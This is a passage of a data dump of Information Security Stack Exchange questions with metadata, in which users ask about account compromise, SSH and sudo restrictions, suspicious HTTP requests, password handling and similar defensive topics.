<p>That would immediately make the whole system administration <em>a lot</em> easier and logical, eliminating the need for complex solutions like chroot jails, separate bash environments, splitting servers into virtual machines, using containers and so on. And it's so simple, a matter of a couple of conditions in the code, if I understand it correctly from a developer's perspective. Also, I want to be in control of my VPS, not having to trust any other third person believing he/she won't steal my information and/or destroy my whole system either by making a mistake or intentionally and basically it can be considered as a serious security vulnerability from a certain point of view.</p>

<p>This seems so obvious and logical for me, that I was really discouraged and embarrassed that it's really isn't like that in Linux. Maybe 20 years ago when Linux was created it was enough to have only a root and sudoers and the rest of users to accomplish tasks they had at that time, but today everything goes a bit different way already and that archaic approach is not usable anymore.</p>

<p>Of course I realize I might be understanding something incorrectly and there is a strong reason why it has to be as it is. If so, then please let me know why is it so and what is a correct and easy way of solving my problem described above without a need to build a behemoth on my VPS or manually administering it all the time by myself. After all, it should be user-friendly, right? Now it's not.</p>
","236516","","6253","","2020-06-12 23:56:05","2020-06-12 23:56:05","Properly granting restrictive administrative privileges to developers on a production server","<linux><account-security><permissions><sudo>","1","18","","2020-06-13 00:12:06","","CC BY-SA 4.0"
"233157","1","233165","","2020-06-12 15:09:25","","2","514","<p>I have recently started using Cloudflare's firewall in front of a web application. This app has a limited user base of selected applicants and they must log in to view anything. There is no public registration form and nothing within the portal can be accessed without an account.</p>

<p>Since moving the DNS to Cloudflare I can see we are receiving numerous daily HEAD requests to paths that are only accessible within the portal.</p>

<p>These requests come from one of two groups of IP addresses from the United States (we are not a US-based company; our own hosting is based in AWS Ireland region and we're pretty sure at least 99% of our users have never been US-based):</p>

<p><strong>Java User Agents</strong></p>

<ul>
<li>User agent is <code>Java/1.8.0_171</code> or some other minor update version.</li>
<li>The ASN is listed as Digital Ocean.</li>
<li>The IP addresses <a href=""https://www.abuseipdb.com/check/159.65.43.210"" rel=""nofollow noreferrer"">all seem to have had similar behaviour reported previously</a>, almost all against Wordpress sites. Note that we're not using Wordpress here.</li>
</ul>

<p><strong>Empty User Agent</strong></p>

<ul>
<li>No user agent string.</li>
<li>The ASN is listed as Amazon Web Services.</li>
<li>The IP addresses have very little reported activity and do not seem at all connected to the Java requests.</li>
</ul>

<p><strong>Other Notes</strong></p>

<ul>
<li>The resources being requested are dynamic URLs containing what are essentially order numbers. We generate new orders every day, and they are visible to everyone using the portal.</li>
<li>I was unable to find any of the URLs indexed by Google. They don't seem to be publicly available anywhere. There is only one publicly accessible page of the site, which is indexed.</li>
<li>We have potentially identified one user who seems to have viewed all the pages that are showing up in the firewall logs (we know this because he shows up in our custom analytics for the web app itself). We have a working relationship with our users and we're almost certain he's not based in the US.</li>
</ul>

<hr>

<p>I am aware that a HEAD request in itself is nothing malicious and that browsers sometimes make HEAD requests. Does the Java user agent, or lack of a user agent in some cases, make this activity suspicious? I already block empty user agents and Java user agents through the firewall, although I think Cloudflare by default blocks Java as part of its browser integrity checks.</p>

<p><strong>Questions</strong></p>

<ol>
<li><p>Is there any reason why these might be legitimate requests that I shouldn't block? The fact it's a HEAD request from a Java user agent suggests no, right?</p></li>
<li><p>One idea we had is that one of the users is sharing links to these internal URLs via some outside channel, to outsource work or something. Is it possible some kind of scraper or something has picked up these links and is spamming them now? As I say, I was unable to find them publicly indexed.</p></li>
<li><p>Is it possible the user we think is connected has some sort of malware on their machine which is picking up their browser activity and then making those requests?</p></li>
<li><p>Could the user have some sort of software that is completely innocent which would make Java based HEAD requests like this, based on their web browsing activity?</p></li>
</ol>

<p>Any advice as to how I should continue this investigation? Or other thoughts about what these requests are?</p>
","69191","","","","","2020-06-12 18:05:47","Getting numerous HEAD requests by Java user agents to resources that require authentication to view within a web application. Should I block them?","<web-application><http><firewalls><account-security><audit>","1","0","","","","CC BY-SA 4.0"
"24013","1","24014","","2012-11-15 04:29:28","","3","4763","<p>We have several dedicated servers.</p>

<p>We need to ensure ""<strong>root</strong>"" user <strong>can not be accessible through SSH outside of LAN</strong>.</p>

<p>I have searched and found the followings #</p>

<ul>
<li><a href=""http://www.raspberrypi.org/phpBB3/viewtopic.php?f=36&amp;t=20826"" rel=""nofollow"">http://www.raspberrypi.org/phpBB3/viewtopic.php?f=36&amp;t=20826</a></li>
<li><a href=""http://raspi.tv/tag/disable-password-login-for-ssh"" rel=""nofollow"">http://raspi.tv/tag/disable-password-login-for-ssh</a></li>
<li><a href=""http://kb.eukhost.com/steps-to-change-ssh-port-of-a-server/"" rel=""nofollow"">http://kb.eukhost.com/steps-to-change-ssh-port-of-a-server/</a></li>
<li><a href=""http://www.cyberciti.biz/tips/ssh-public-key-based-authentication-how-to.html"" rel=""nofollow"">http://www.cyberciti.biz/tips/ssh-public-key-based-authentication-how-to.html</a></li>
</ul>

<blockquote>
  <p>We need exactly the root user will be unable to access outside of LAN.
  but other users will be accessible outside of LAN. 
  Because other users can do their work only within their scope.</p>
</blockquote>

<p><strong>Our OS details</strong></p>

<pre><code># cat /proc/version
Linux version 2.6.18-308.4.1.el5PAE (mockbuild@builder10.centos.org) (gcc version 4.1.2 20080704 (Red Hat 4.1.2-52)) #1 SMP Tue Apr 17 17:47:38 EDT 2012
</code></pre>

<p>Please help me to resolve the issue?</p>
","12757","","12757","","2012-11-15 08:40:29","2012-11-15 08:40:29","How to restrict SSH access outside of LAN?","<ssh><security-theater>","1","3","","2012-11-15 07:22:51","","CC BY-SA 3.0"
"233243","1","","","2020-06-15 06:25:08","","0","1523","<p>My mother recently had her Amazon account (buyer, not seller) hacked. She is not a security expert but does work in database management, so she is definitely not computer illiterate. I am also not a security expert but I work as a software engineer, and still this situation is strange to me. She asked me for advice and despite our best efforts, the hack is still ongoing. I would like to know <strong>how</strong> this hack could have been carried out, and <strong>what steps</strong> should be taken to stop further damage.</p>

<p>Here is the sequence of events, to the best of my memory (as she told the story to me over several phone calls):</p>

<ol>
<li>Two weeks ago my mother noticed a $50 Nintendo eShop Gift Card ordered by her Amazon account. She immediately understood that her account was hacked.</li>
<li>She immediately changed her password (I later learned that this was a 1-character change) and turned on two-factor authentication (2FA) going to her cell phone. She assumed that this process would ""kick off"" the hacker who might still be logged in, in their own browser session.</li>
<li>A couple days later another unauthorized purchase was made, again for a Nintendo eShop Gift Card. During this time, my mother did not receive any messages related to 2FA.</li>
<li>The hacker added a new credit card to the account, using a name and card number that we do not recognize. The billing address was left unchanged.</li>
<li>My mother called me at this point asking for advice, since she didn't understand how the hacker still had access to the account after the password was changed and 2FA was turned on. I was also confused, and advised her to change the password to a <em>completely different</em> one, and then call Amazon for advice. I was unable to find an option on Amazon's website to force other account sessions to be logged out. I also hypothesized that her computer could be compromised, for example with a keylogger that would make password changes useless (but how does that get around 2FA?). I also considered the possibility of malware on her computer placing the fraudulent orders on her behalf, but it would take an incredibly specialized attack to do this, and it doesn't seem like an extremely skilled hacker would go through that trouble for a couple hundred dollars in gift cards.</li>
<li>She spoke to an Amazon representative. The representative did not know whether the process of changing a password will automatically log out other sessions, but the representative did make a request for that to happen (by putting the account ""on hold"").</li>
<li>My mother changed the password to a <em>completely different</em> one, using <em>a different computer</em>.</li>
<li>Today another unauthorized purchase was made, $40 worth of Nintendo eShop Gift Cards. The hacker also added a credit card with <em>my father's</em> name and his work address, but we do not recognize the card number. Again my mother has not received any suspicious 2FA messages.</li>
</ol>

<p><strong>Questions:</strong></p>

<ul>
<li><strong>How might this attack have occurred?</strong></li>
<li><strong>What can we do to stop the attack?</strong></li>
</ul>

<p>So far all of the following has been unsuccessful: two password changes, the latest being a completely different password set on a different computer, adding 2FA, and having the account put ""on hold"" which according to the Amazon representative should log out other sessions.</p>
","236655","","236655","","2020-06-15 08:07:16","2020-11-17 06:04:30","How might this Amazon account hack occur?","<account-security><amazon>","2","2","","","","CC BY-SA 4.0"
"165168","1","165173","","2017-07-14 11:08:49","","0","102","<p>I am following CIS hardening best practices and it states that the log out time for shell is 60 seconds. This seems pretty steep for non production environments, is there any other best practise around the idle log out time?</p>

<p>Thanks in advance.</p>

<p>Chris </p>
","149019","","","","","2017-07-14 11:48:13","Shell idle log out time best practice?","<account-security><account-lockout>","1","0","","","","CC BY-SA 3.0"
"165253","1","","","2017-07-16 00:13:48","","0","2632","<p>Can someone hack my router and change my admin password for Linksys router but leave my wifi passwords the same. Tried logging in on 3 different browser and 2 different computers. I also tried using the general admin password when initially setting it up in case it failed during an electrical surge. Not such why I couldn't log in to my router. Could it have been hacked?</p>
","153443","","","","","2017-07-16 00:30:26","My admin password was changed!","<router><account-security><administration>","2","0","","","","CC BY-SA 3.0"
"233775","1","","","2020-06-25 16:05:53","","0","140","<p>There is a healthy debate around a series of stack overflow posts that refer to the &quot;RunAs&quot; command. Specifically the discussion is in reference to design decision that the folks at Microsoft made a long time ago, to users of this command to enter the users password in one specific way, Raymond Chen accurately summarizes one side of the <a href=""https://devblogs.microsoft.com/oldnewthing/20041129-00/?p=37183"" rel=""nofollow noreferrer"">argument quite clearly</a>:</p>
<blockquote>
<p>The RunAs program demands that you type the password manually. Why
doesn’t it accept a password on the command line?</p>
<p>This was a conscious decision. If it were possible to pass the
password on the command line, people would start embedding passwords
into batch files and logon scripts, which is laughably insecure.</p>
<p>In other words, <strong>the feature is missing to remove the temptation to use</strong>
<strong>the feature insecurely.</strong></p>
<p>If this offends you and you want to be insecure and pass the password
on the command line anyway (for everyone to see in the command window
title bar), you can write your own program that calls the
CreateProcessWithLogonW function.</p>
</blockquote>
<p>I'm doing exactly what is being suggested in the last line of Raymond's comment, implementing my own (C#) version of this application that complete circumvents this restriction. There are also <a href=""https://serverfault.com/a/999680/422333"">many others</a> who have done this <a href=""https://github.com/gfody/PowershellModules/tree/master/RunAs"" rel=""nofollow noreferrer"">as well</a>. I find this all quite irritating and agree with <a href=""https://stackoverflow.com/questions/16107381/how-to-complete-the-runas-command-in-one-line#comment79200772_16116329"">sentiment expressed by @AndrejaDjokovic who states</a>:</p>
<blockquote>
<p>Which is completely defeating. It is a really tiresome that idea of
&quot;security&quot; is invoked by software designers who are trying to be
smarter than the user. If the user wants to embed the password, then
that is their prerogative. Instead all of us coming across this link
are going to go and search other ways to utilize SUDO equivalent in
windows through other unsavory means, bending the rules and wasting
times. Instead of having one batch file vulnerable, i am going to
sendup reducing overall security on the machine to get &quot;sudo&quot; to work.
Design should never smarter than the user. You fail!</p>
</blockquote>
<p>Now while I agree with the sentiment expressed by Microsoft and their concern with &quot;embedding passwords into batch files&quot; (I personally have seen poor practice myself way too many times), it really does strike me as wrong what Microsoft has done here. In my specific example I'm still following best practices and my script won't store credentials, however I'm forced to resort to a workaround like everybody else.</p>
<p>This decision really follows a <a href=""https://superuser.com/a/563112/582651"">common pattern</a> at Microsoft of applications <a href=""https://superuser.com/a/972506/582651"">acting in ways</a> that are contrary to the needs of the specific users with the intention of &quot;<a href=""https://superuser.com/questions/1110265/how-to-prevent-windows-10-from-restarting-the-computer-after-installing-updates/1125051#1125051"">helping</a>&quot; the users by <a href=""https://superuser.com/a/922599/582651"">preventing them</a> from completing a action that is viewed as unfavorable. Then obfuscating or purposely making the implementation of workarounds more difficult.</p>
<p>This leads us to a broader question, extremely relevant to this issue, who is the true responsible party when it comes to security around credentials, the user of the software or the designer of the software? Obviously both parties hold some responsibility, but where is the dividing line?</p>
<p>When you create tools for other developers should you seek to the best of your ability to prevent them from using your application in an insecure manner, or do you only need to be concerned about the application itself and whether it's secure internally (irregardless to how the user invokes it)? If you are concerned about &quot;how&quot; they are using your application, to what extent do you need validate their usage (example: should &quot;RunAs&quot; fail if the system is not fully &quot;up to date&quot; i.e. insecure in another way), if that example seems far fetched, then define that line, in the case of &quot;RunAs&quot; the intention is quite clear, the developers who created it are not only concerned about managing credentials securely internally with their application but also care deeply about the security implications of how you use it. Was their decision correct in validating the usage in this case, and if so/or not where should that dividing line be for the applications that are created in the future?</p>
","152000","","","","","2020-06-25 19:44:55","Who (Designer or User) Should be Resposible for the Correct/Secure Usage of a Tool Intended for Developers/Admins?","<credentials><obfuscation><secure-coding><microsoft><security-by-design>","1","2","","2020-06-25 19:58:41","","CC BY-SA 4.0"
"24589","1","24806","","2012-11-27 19:20:10","","4","8244","<p>I have two web app running on same host on same path but on different port</p>

<p><a href=""http://somedomain.com/"" rel=""nofollow"">http://somedomain.com/</a></p>

<p>and</p>

<p><a href=""https://somedomain.com/"" rel=""nofollow"">https://somedomain.com/</a></p>

<p>now when I visit first app it serves the cookie say with name <code>abc</code>, and now my browser has this <code>abc</code>, now if I open another tab and goto app2 (https one), browser sends the cookie <code>abc</code> in request (because of same domain, same path) and this app sets the secure flag true because its running on <code>https</code>, </p>

<p>so now in my browser <code>abc</code> is overriden by <code>secureflag</code> = <code>true</code>, so if I make request to app1 (which is running on <code>http</code>), it doesn't send <code>abc</code> because of secure flag and it makes me logout because <code>abc</code> is session cookie</p>

<p>what is the secure way to overcome this, </p>

<p>both of the apps are mine so cookie hijacking from another app is not the case</p>

<p>I tried setting app2 at some other path <code>/foo</code></p>

<p>so now its </p>

<p><a href=""http://somedomain.com"" rel=""nofollow"">http://somedomain.com</a>  </p>

<p>and  </p>

<p><a href=""https://somedomain.com/foo"" rel=""nofollow"">https://somedomain.com/foo</a></p>

<p>if my browser has the cookie from foo first then everything goes ok, but if I hit app1 first then it still sends the cookie to <code>/foo</code></p>
","16476","","","","","2012-12-01 21:29:56","cookie issue with same domain same path but different port","<web-application><webserver><cookies><security-theater>","1","0","","","","CC BY-SA 3.0"
"233988","1","233989","","2020-06-30 06:53:36","","1","199","<p>I got a strange email and I just want to confirm my suspicions.</p>
<p>For background, I have my own email server which I set up using <a href=""https://www.iredmail.org/"" rel=""nofollow noreferrer"">iRedMail</a> on a VPS. I have an acquaintance who most likely has me on their address book, although I don't have them on mine.</p>
<p>I got a highly suspect email with &quot;Urgent! &lt;acquaintance's name&gt;&quot; as the subject, and a body that just said they need a favour. Looking at the headers of the email, I see that the Sender field is an unrelated university email address from another country, while the From field is my acquaintance's name <em>and a different email address than the one I had communicated with them in the past</em>.</p>
<p>My hypothesis is that their account got hacked, the hacker stole their address book and is sending a scam to all of their contacts.</p>
<p>My <em>fear</em> is that my own server got hacked, or something. My email setup did not complain about this email even though I have virus scanning, and I expect that the regular checks (DKIM, SPF etc.) were done.</p>
<p>Can anyone confirm my hypothesis?</p>
","237525","","237525","","2020-06-30 11:44:35","2020-06-30 11:44:35","What does it mean to get an email from someone with a different actual sender?","<account-security><server><email-spoofing>","2","3","","","","CC BY-SA 4.0"
"234040","1","","","2020-07-01 07:03:55","","2","328","<p>I have limited client devices and one server.</p>
<p>I want to create a client-server secure connection while app installation but don't want human-interaction between devices and server like registration or login.</p>
<p>After installation app, this client device should be already authenticated.</p>
<p>Also want to avoid incorrect/fake devices.</p>
<p>In which way, I can implement this issue?
I am newbie to information security. Please help me.</p>
","237592","","","","","2020-07-01 07:30:40","Authenticate limited client devices from server without login process","<authentication><web-application><account-security><web-authentication>","1","0","","","","CC BY-SA 4.0"
"234060","1","234070","","2020-07-01 14:05:07","","83","17771","<p>I recently jumped onto the hypetrain for an unnamed email service and am currently on my way to update all my accounts on various websites to get most of my (future) data off Google's Gmail.</p>
<p>During this adventure I came across a couple user-flows of changing your e-mail address which I would like to share (amounts like &quot;many&quot; or &quot;a few&quot; are purely subjective, I did not count):</p>
<ol>
<li><p><strong>No questions asked</strong></p>
<p>The email address is just changed without any confirmation emails, second password check, or spellchecking (two input fields). The email address is the main login method to this account with some sensitive data. Any person with malicious intent will not be stopped from taking over my account if they change the email address and afterward change my password.</p>
</li>
<li><p><strong>Confirmation of new email</strong></p>
<p>What I feel like the method used by most platforms: You will receive a confirmation email to the new address you provide. This will assure you typed in the email correctly, but will not stop anyone from changing the main login method though.</p>
</li>
<li><p><strong>Confirmation through old address</strong></p>
<p>Very few platforms send an email to the old address to check if I am the actual owner of this account. If I click the link in the mail or enter a number they send me, the address is changed.</p>
</li>
<li><p><strong>Confirmation through old and of new address</strong></p>
<p>Just once I had to confirm with my old address that I am the owner of the account <em>and</em> got another email to the new address to check that it does indeed exist.</p>
</li>
</ol>
<p>Looking back at it, it feels like the usual UX vs security conflict. While method 1 provides the most comfortable flow, I see the most issues with it, as already pointed out.
Having to confirm the old address and the new one is kind of a hassle, but it's the best way of those listed to keep the account of your users in their own hands.</p>
<p>Are there other common methods I am not aware of? What is generally considered best practice?</p>
","125927","","71850","","2020-07-02 20:51:58","2020-07-30 03:01:09","What is the suggested best practice for changing a user's email address?","<authentication><email><account-security>","8","0","","","","CC BY-SA 4.0"
"165964","1","165967","","2017-07-25 07:56:55","","19","7924","<h2>Intro</h2>

<p>I have a free mail account on <a href=""https://www.gmx.de"" rel=""nofollow noreferrer"">this</a> (german) website. If I type my password wrong I get, once successfully logged in, a message telling me about my failed log-in attempt.</p>

<h2>Problem</h2>

<p>Recently I noticed that from day to day the site notifies me of numerous failed log-in attempts (between 8 and 32). There is no feature as in GMail, where location and device of the failed log-in are recorded, so I am a bit in the dark. And also quite worried.</p>

<h2>Question</h2>

<p>I have changed my password everday for four days now. Immediately closing the account is not an option since I still have to compile a list where this mail address is used.</p>

<p><strong>What appropriate steps to secure my account are to be taken at this point?</strong></p>

<h2>Update</h2>

<p>The log-in attempts have declined over the last three days, maxing out at around ten altogether. Yesterday there was no failed log-in attempt logged.
Nevertheless I resorted to your many suggestions and</p>

<ul>
<li>contacted GMX support, but have not heard back from them (certainly not using their 3€/min rip-off hotline)</li>
<li>started using a password manager</li>
<li>created easy-to-remember-but-hard-to-guess passwords</li>
<li>started forwarding mails from the affected account to a more safe mail service</li>
<li>learned about 2FA</li>
<li>wrote down all the sites and services the affected address is used with, in order to swiftly be able to close my account</li>
</ul>

<p>Since there are many good answers I will wait a few days and mark the one with the most up-votes as the final answer. Thanks for your help!</p>
","155192","","155192","","2017-07-27 05:57:06","2017-07-27 05:57:06","Someone is trying to access my mail account, what safe actions can I take?","<email><password-cracking><account-security>","5","13","","","","CC BY-SA 3.0"
"97735","1","","","2015-08-25 13:39:04","","0","268","<p>We are using MySQL Amazon RDS. The instance is encrypted, and also only available via SSH from the production server EC2 instance. </p>

<p>One of the things we are trying to do is give access to some critical data that that we collect and store in this database to ABSOLUTELY NO ONE, NOT EVEN our employees for support. Given this might mean that we cannot have technical support. Some of the data in some tables is OK to be viewed and accessed by our internal employees for emailing, marketing etc., So questions</p>

<ol>
<li><p>How does the industry handle such a user scenario, where some of the
data in some of the tables, some of the tables themselves need to be locked down, and only available to the end users via secure API's</p></li>
<li><p>Is there a way to completely lock down the data of the users that no
one can see them even with regular sql code? </p></li>
<li><p>Is it possible to lock particular rows in the table also based on
    some parameter?</p></li>
</ol>
","46847","","","user45139","2015-08-25 13:47:06","2015-10-24 19:39:37","Locking down Amazon RDS table data","<encryption><access-control><amazon><content-security-policy>","1","0","","","","CC BY-SA 3.0"
"234076","1","234078","","2020-07-01 17:49:31","","0","141","<p>I have a web site and a service in a server.</p>
<p>I'm developing the &quot;Register User&quot; and &quot;Login&quot; components.</p>
<p>I've searched on the internet and I've found two protocols to login user using 'nonce' and 'salt', <a href=""https://stackoverflow.com/a/5828962"">here</a> and <a href=""https://stackoverflow.com/a/24978909"">here</a>.</p>
<p>I've also found two explanations in order to use SSL/TLS, <a href=""https://stackoverflow.com/a/21716654"">here</a> and <a href=""https://stackoverflow.com/a/4121657"">here</a>, and <a href=""https://stackoverflow.com/a/37704936"">bcrypt</a>.</p>
<p>I believe these tips will help me a lot, however I have some questions:</p>
<p>How could I guarantee that <strong>only</strong> my client application will request a 'nonce' to my server? In other words, I would not like that others could request a 'nonce'.</p>
","237636","","71850","","2020-07-01 21:27:18","2020-07-01 21:27:18","How to guarantee only my client application can request a nonce?","<tls><account-security><defense><nonce>","1","1","","","","CC BY-SA 4.0"
"234131","1","","","2020-07-02 17:51:04","","0","584","<p>I own a ZTE Axon 7 (model 2017G) that I purchased secondhand from a <a href=""https://www.ebay.de/usr/smallbug_technikshop"" rel=""nofollow noreferrer"">reputable vendor</a> in Germany ca. 3 years ago. The phone has been working well, and I updated the OS to Android 8.0. manually earlier this year using an official image from ZTE.</p>
<p>A severe case of butterfingers affected me yesterday (and I guess today), and I dropped the phone a couple of times (the phone has never been in use with out this very good TPU case from this company called Spigen). The last of these drops (today) broke the display. No physical damage, but half the screen is &quot;gone&quot;--it looks like the display pictured here in <a href=""https://www.ifixit.com/Answers/View/122990/Half+my+screen+is+covered+with+colored+lines.+Can+I+fix+this"" rel=""nofollow noreferrer"">this iFixit</a> thread but with multicolored dots instead of lines.</p>
<p>I wasn't too worried about this (hopefully it's just a loose cable), but <strong>then I noticed I was only swiping up to get past the lockscreen.</strong> Now here's the thing: <strong>I've always used this phone with a 4-digit lockscreen PIN.</strong> I can confirm--that as recently as yesterday--my partner and I mentioned the PIN because my phone had died (battery ran too low), and they had to enter the PIN after restarting it; so this isn't my imagination going wild.</p>
<p>As far as I can tell, nothing else has been affected. All the data still seems to be there, and nothing seems to have been &quot;hacked&quot; (I even briefly texted my partner with the broken screen to let them know that the screen is broken).</p>
<p>I went and checked in the settings, and the lockscreen PIN isn't active there either as far as I can tell (so it doesn't seem to be some kind of a glitch). I restarted the phone, and it asked for the PIN as it does normally to authorize the SIM. So it appears <strong>the lockscreen PIN has been disabled entirely, but it wasn't me who disabled it.</strong></p>
<p>How is this even possible? Can the phone being dropped at a weird angle disable the lockscreen PIN? (It sounds ridiculous just even typing that.) How can I check for signs of intrusion on the device (with the broken screen)?</p>
<p>Some &quot;events&quot;/facts that may be of relevance(?):</p>
<ul>
<li>The one other question I have on this SE is about legitimate Google 2FA codes arriving from random numbers. This hadn't happened in a while, but it happened again on 29.06.2020 (this Monday).</li>
<li>I always put my phone next to the bed during the night, and I did so last night. The phone was in another room this morning, however. Neither my partner nor I remember moving it. It is plausible that I moved the phone (I have a mild tendency to sleep walk), but I doubt I would have been able to disable the PIN in my sleep.</li>
<li>The phone's storage is not encrypted.</li>
</ul>
","226320","","","","","2022-08-23 21:07:45","Android phone's lockscreen PIN disappeared?","<passwords><android><account-security><smartphone>","3","0","","","","CC BY-SA 4.0"
"234136","1","234305","","2020-07-02 22:36:44","","0","350","<p>I am about to sign up for an online school, which is an accredited statewide online school, and notice that the password they want me to enter is fully visible on the form. Should I be concern about their information security? Does a form like this indicates that the way the way the school protects students' data is not secure, such as storing password verbatim rather than something like one-way hash?</p>
<p>If such forms violate established data security practices, what document(s) should I refer to the school's IT people regarding that?</p>
<p><a href=""https://i.stack.imgur.com/Sc0Uo.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Sc0Uo.png"" alt=""Online sign-up form"" /></a></p>
<p>UPDATE:</p>
<p>The next screen reveals the password verbatim. I clipped away the user content, but the password was shown unencrypted, along with the student name and the user name:</p>
<p><a href=""https://i.stack.imgur.com/5CZ2K.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/5CZ2K.png"" alt=""After sign-up"" /></a></p>
<p>Could you point me to the industry standards of password storage that I could forward them?</p>
","81616","","81616","","2020-07-06 19:31:54","2020-07-06 21:17:43","Password is visible in online sign up form","<password-management><account-security>","4","3","","","","CC BY-SA 4.0"
"166375","1","","","2017-07-30 14:27:37","","3","9393","<p><em>I posted this on Google yesterday but I think it deserves more visibility. If what I think might have happened, actually happened, then Chrome may not be secure:</em></p>

<p>Something weird happened yesterday morning and I am trying to get my head around it.</p>

<p>I have a Windows 2012 Server hosting virtual machines, but yesterday I just wanted to do a quick search on mortar types and didn't log into a VM. Symantec is installed (12.1.5 - yes I know it is old) and only visit green WOT sites. I opened a few of the search results in tabs and starting going through them. Then, all of a sudden, Chrome starting flipping pages and I had a message that Chrome was downloading and installing something. Then I noticed that it was logged into a Google account. it was the account for my property manager's assistant (I live in a condo). I used task manager to kill chrome immediately and it all stopped. I have Chrome 59.0.3071.115 on my server, but it looks like it just downloaded an update.</p>

<p>I could not figure out how the heck the property manager's assistant could have logged onto my server and then why he would log into chrome. I checked and Symantec was running. I checked my firewall router and RDP was still disabled to the server, plus this was the admin console and why would a hacker do something so obvious? I always lock my screen (old habit) when i leave my desk, even though only my wife and I live here - and one of us is almost always home. [Plus the session locks after a 15 minute timeout.] There is no way anyone had physical access unless they took the master key and came in while we were asleep, but that would have been really dumb. [And it would be next to impossible for anyone else to know my password.] Even so, why log into Google?</p>

<p>I downloaded MalwareBytes and ran a scan on my C drive with it and with Symantec. Both only found a few tracking cookies.</p>

<p>I also checked my main service ports using grc.com and everything is in stealth mode. I confirmed with Event Viewer that no RDP sessions were running (last one was months ago).</p>

<p>The only thing I can think of is that one of the sites I clicked on ran code that automatically logged into Chrome using the property manager's assistant account. Why? Since we are both in the same building, both our IPs would be in a similar IP range. Perhaps the assistant's computer is being hacked regularly and they were trying to get back in. Before killing chrome, I peaked at the user account settings, and the assistant's password had not been changed since January this year.</p>

<p>I do not think the assistant is computer savvy enough to be behind any of this. Most likely is that he has a simple password and it was simply hacked. I don't know what having access to his account would provide, but I imagine a remote program could instruct it to upload files. If so, they could have the passwords for all the security panels in the building.</p>

<p>I have not used my Google account for years, and don't think I ever used it on my server.</p>

<p>Can someone please confirm if this is a possible scenario? If it is not, then it looks like we had an invader in here, and I will call the police. I will notify the manager's office on Monday.</p>

<p>No, I do not have access to the account. However, if I click ""Sign In"", the account comes up as the default, but I do not know the password. Also, I am assuming it is the property manager's account. I have not talked to them yet, but plan to this afternoon once I get a reply back for a meeting. I should be able to confirm if it is their account. Once they have changed the password, I will post more info.</p>

<p>The only extensions I have are:</p>

<ul>
<li>Adobe Acrobat</li>
<li>Google Docs</li>
<li>Google Docs Offline</li>
<li>Google Sheets</li>
<li>WOT: Web of Trust, Website Reputation Ratings.</li>
</ul>

<p>There is a chance that someone got the key and entered the unit. It seems really unlikely, but is not impossible. I'm on the board here and there has been a lot of conflict. Four board members have resigned as a result of conflict with the President over the past year or two. I have not as I was urged by others in the building to remain. The Property Manager was just let go. I had full faith and trust in her. A new property manager is starting as of this morning, and we just hired a new assistant superintendent. My first thought was they tried to get evidence or delete evidence - one of the board members is suing another. But I just do not know.</p>

<p>If it is possible Chrome is ""hackable"" as described, then it seems the most likely scenario to me. Its one or the other.</p>
","155602","","485","","2017-08-01 07:37:13","2020-08-05 06:24:32","Remote hack of my computer via Chrome using Google account","<malware><exploit><google><chrome><account-security>","2","10","","","","CC BY-SA 3.0"
"234304","1","234325","","2020-07-06 20:18:01","","1","946","<p>We have 3-4 S/4 HANA applications in our environment and want to enable HTTP Security Headers, but couldn't figure out how to go about it. We then approached SAP directly and even their solutions are not working, and their support team has a pretty vague and dissatisfactory answer,they said that the application doesn't require such headers security mechanisms are already in place to mitigate a variety of attacks.</p>
<p>Now me and my team are helpless. Has someone achieved it? The application in question are SRM, Fiori, GRC &amp; ROS.</p>
","237962","","","","","2020-07-07 09:45:22","Enabling HTTP Security headers in S/4 Hana web applications","<content-security-policy><header>","1","0","","","","CC BY-SA 4.0"
"166628","1","","","2017-08-02 20:43:14","","-1","86","<p>If my application is sending credentials to an auth server over https, is there any real benefit of encrypting it (using RSA for example) before sending it to the auth server? Or is the benefit so minimal I may as well just send it as plaintext?</p>
","141587","","","","","2017-08-02 20:51:13","Is There Any Real Benefit To Encrypting A Password Before Sending Over SSL","<tls><authentication><account-security><credentials>","1","0","","2017-08-02 20:54:10","","CC BY-SA 3.0"
"234535","1","","","2020-07-11 10:44:14","","2","82","<p>I'm working with a company (say, Acme) that does some ongoing data collection and processing for me. The data in question is private but not all <em>that</em> sensitive. Part of Acme's service has password-protected access via the web, so Acme obviously needs to be handling security around internet-facing services.</p>
<p>A few days ago I wanted to enable a feature that would involve Acme streaming some of my private (but not all that sensitive) data to a third company (say, Bravo), and during the feature enabling process I got a warning that Bravo would be granted <strong>full</strong> access to my Acme account. (So I didn't proceed.) I've since confirmed with Acme that &quot;right now&quot; that's how it works (it really is <strong>full</strong> access, Bravo could [but in theory won't] change my account password, cancel my service, etc.), though they have plans to tighten it up in the future.</p>
<p>This makes me wonder about Acme's internal security processes. I'm no expert in this area, but only granting minimum access is really basic, right? If they're not doing it when connecting with an external company like Bravo, is that a big red flag in terms of what else they're doing in terms of security best practices internally? Or given that everyone has contracts with everyone else, not really that big a deal?</p>
","238117","","238117","","2020-07-11 14:28:17","2020-07-11 14:28:17","Implications re security practices of full account access granted to third parties","<account-security><architecture><pii>","1","0","","","","CC BY-SA 4.0"
"234574","1","","","2020-07-12 10:48:42","","0","126","<p>I'm building some simple dashboard app for myself, but I want to have them on multiple devices - hence the server and front end. As I will be the only user who will access the application server, what security should I implement?</p>
<p>Stack:
Postgres
Ktor (Kotlin) server, HTTPS, only REST API
Front end</p>
<p>I'll run AWS Lightsail instance since I don't need anything heavy. Postgres and application server will be there, with only ports 443 and 22 open. Front end will be on S3 with CloudFront.</p>
<p>I'm doing this because it's easier for me to make a browser &quot;app&quot;, than to make an Android app + something for desktop and keep them in sync.</p>
<p>I'll be using the app from multiple networks. At home (where I don't have a static IP, which would solve some of the problems), from mobile network, from work, when traveling to other countries, etc.</p>
<p>For background, I've been working on server for almost 3 years, Spring + Hibernate, Postgres. I have a fair knowledge of linux, hosting a server on it, some of AWS services and basic knowledge of database administration. I've done a bit of front end, but I'll have to get back to that soon. I have almost no knowledge of security beyond basic JWT and SSH.</p>
","238266","","238266","","2020-07-12 14:04:58","2020-08-11 15:01:50","Securing application server for a single user","<webserver><account-security>","1","5","","","","CC BY-SA 4.0"
"98422","1","","","2015-09-03 08:12:57","","1","332","<p>Is it safe to keep a file containing the virus (binary?) code on your local machine without executing it? I am testing my application against malicious file uploads and and wondering if it's safe to actually upload this virus into my application and let it store in the upload folder.</p>
